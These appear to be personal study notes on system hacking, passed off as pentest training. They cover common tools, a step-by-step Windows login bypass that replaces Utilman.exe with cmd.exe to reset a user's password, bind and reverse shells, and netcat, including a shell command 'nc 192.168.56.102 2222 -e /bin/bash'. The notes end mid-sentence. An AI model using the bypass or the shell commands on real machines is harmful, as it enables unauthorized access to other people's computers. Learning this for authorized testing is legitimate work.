

- System hacking is defined as **the compromise between computer systems and software to access the target computer and steal or misuse their sensitive information**. 
- The malware and the attacker identify and exploit the vulnerability of the computer system to gain unauthorized access. 
- Here the malicious hacker exploits the weaknesses in a computer system to gain unauthorized access to its data or take illegal advantage.
- **internal and external penetration testing**
- the **process of exploiting vulnerabilities in computer systems, networks, or software** to gain unauthorized access, control, or information 

### Common Tools and Techniques

- **Nmap**: A network scanning tool used for network discovery and security auditing.
- **Metasploit**: A penetration testing framework that allows for the development and execution of exploit code.
- **John the Ripper**: A password cracking tool.
- **Wireshark**: A network protocol analyzer used for network troubleshooting and analysis.
- **Burp Suite**: A comprehensive tool for web application security testing.

## Linux System Hacking

- Hackers usually use the following techniques to hack the linux system. 
    - Hack Linux using the SHADOW file. 
    - SSH key leak 
    - Remote Code Execution(RCE) 
    - Another technique commonly used by hackers is to bypass the user password option in Linux.(Privilege Escalation) 
    - In another technique, the hacker detects the bug on kernel and tries to take advantage of it

## Windows Hacking

- There are several tricks and techniques to crack a windows password. But, from the hacker's point of view, if you can **use social engineer your victim and find a Windows computer open, you can easily modify the existing password and give a new password that will be unaware of the victim or the owner of the computer**. 
- Also There is a simple method to bypass windows login
#### Windows Login Bypass
on the login page there is a button that can be vulnerable to this.
- A button on the right bottom, beside the Ethernet icon is called “**Easy to access**”
- When you click this button it will open a program called **Utilman.exe from C:\Windows\System32** 
- **Rename this file to other thing** and **rename your terminal to Utilman.exe** then BOOM … 
- We will Swap their name. 
     - Shutdown your windows 
     - **Turn it on and when you see windows logo, press the power button** , it will shut  Again turn it on and when you see windows logo, press the power button , it will shut **Repeat this until you get the recovery mode**. 
     - on Recovery mode then go to 
         1. Advanced option 
         2. Troubleshoot 
         3. Advanced Options 
         4. System Image Recovery 
         - System image recovery Goto: 
             1. Cancel 
             2. Next 
             3. Advanced
             4. Install a Driver 
             5. OK 
         - Renames 
             1. This PC 
             2. Find the Correct C drive -- Their letter will be different 
            3. Go to 
                 - Your C drive>Windows>System32 . 
            4. Find and Rename Utilman.exe 
                - Utilman.exe -> Utilman1.exe  
            5. Find and Rename 
                 - cmd.exe a. Cmd.exe -> Utilman.exe 
            6. Exit and close them 
            7. Click Continue or restart your pc 
    - Open Windows and Click on the easy to access button 
    - When you get cmd ,type 
         - net user - to see users 
         - net user “username”  -- like hp
    - Add new password 
         - Just Enter to remove the password 
    - Then close cmd and login


## Windows Pentest
learn windows Systems
- Fundamental of Windows 
- Power shell Scripting and usage. 
- Managing Services, Users 
- Active Directory system. -- to manage many computers by a domain controller server. like give same password or wallpaper for all computers....
## Shell 
A shell is a program that interprets our commands and gives the written commands to the Kernel. 
Based on **Remote Access to the shell while Pentest**, it is Classified into: 
- Bind Shell 
- Reverse Shell

### Bind Shell 
- is **a sort of setup where remote consoles(terminal) are established with other computers over the network**. 
- ==**an attacker launches a service on the target computer**== - **opening port**, to which the attacker can connect. 
- **an attacker can connect to the target computer and execute commands on the target computer.** 
- To launch a bind shell, **the attacker must have the IP address of the victim** to access the target computer.

- sometimes this method that the attacker tries to connect is locked by the firewall so there is other way
- bind shell-- the attacker is will open the port by sending malware - backdoor trojan and tries to listen that open port by sending ip and port number to the victim.
### Reverse Shells 
- also known as a **remote shell** or “**connect-back shell**,” **takes advantage of the target system's vulnerabilities to initiate a shell session and then access the victim's computer.** 
- Reverse shells allow attackers to open ports to the target machines, forcing communication and enabling a complete takeover of the target machine. 
- Therefore it is a severe security threat. 
- This method is also commonly used in penetration tests.
- On reverse shells, the **attacker will listen for any request on specific port**, and **the victim will start the request on that port,** so we will have a shell., the victim may not sending the request intentionally. But **if the attacker send him a link/malware that can start the reverse request that can leads to reverse shell**

- this method - the victim itself create connection with the attacker.
    - ==the attacker open listener by opening port== and send malware that forced the victim computer to connect to the attacker computer. so firewall can't lock this because the victim itself tries to connect not from outside. 


### Netcat 
- Netcat is a Command-line Interface (CLI) Based tool that is **used to read/write data over TCP/UDP. **
    - To listen on ports, 
    - To create connection on ports we can use this tool.
- It is a Back-End tool which can smoothly be cross utilized by other programs 
- Used to Create a connection with any protocol/port you want or to create a listener on any port 
- It is a tool That helps to create Reverse shells or Bind shells 
- It is built in on kali and parrot but not for windows.
bind shell -- the victim will be the listener 
reverse shell -- the attacker will be the listener and so open the port
- ==netcat -lvp 'portno== --**to open the port** and listen
     - -l ; listen 
     - -v; verbose - nmap lay endalew log endiyareg
     - -p; port
     - -n; no dns resolution
     ==nc -nlvp 2222==
 - ==nc ip port -e /bin/bash== -- **to connect**
      -  ==nc 192.168.56.102 2222 -e /bin/bash==



# Web servers

- On the **hardware side**, a web server is **a computer that stores web server software and a website's component files** (for example, HTML documents, images, CSS stylesheets, and JavaScript files)
- a web server connects to the internet and supports physical data interchange with other devices connected to the web.
- **Web Server Software is a computer software that uses HTTP and HTTPS to provide a website.**(port 80,443)
- There are a lot of software that can be installed on the server to work like web server. servers are just computers. So to be specific we have to install some web things

### A. Apache server 
- This Server software will help to **provide Web contents**. 
- On linux it comes Built in But on windows you can install it with softwares called Xampp and Wampp and will give you localhost web contents 
- To Start this server software  ==sudo systemctl start apache2==
- From now on our computer is acting like a webserver. 
- Default is port 80
- By going to out IP on any browser we can get a websites. 
- The default path of apache2 is /var/www/html 
- So on any web server the websites are running on This path. 


### B. Python Server 
- use python to start web servers 
- To start the service 
    - **python3 -m http.server port Number** 
- The python will help you to host website from any path on your computer with any port you need. 

### C Ngnix
### D ruby on rails ..


## CVE / Common Vulnerabilities and Exposures

- a **glossary that classifies vulnerabilities.**
- the glossary **analyzes vulnerabilities** and then **uses the common vulnerability scoring system(==CVSS==) to evaluate the threat level of a vulnerability**.
    - measures:- exploitability, impact, scope, maturity, remediation level....
    - based on scoring level -- CVSS V2.0 ratings and CVSS V3.0 Ratings(low, medium, high, critical)
- The CVE glossary is **a project dedicated to tracking and cataloging vulnerabilities in consumer software and hardware**. 
- It is **maintained by the MITRE Corporation** with funding from the US Division of Homeland Security. 
- Vulnerabilities are **collected and cataloged using the Security Content Automation Protocol (SCAP)**. 
- SCAP evaluates vulnerability information and assigns each vulnerability a unique identifier. ● ==**CVE-YEAR-ID**==
- other CWE


## ExploitDB 
- The Exploit Database is maintained by OffSec 
- The Exploit Database is a CVE compliant archive of public exploits and corresponding vulnerable software, developed for use by penetration testers and vulnerability researchers.

-  **zero day** - the 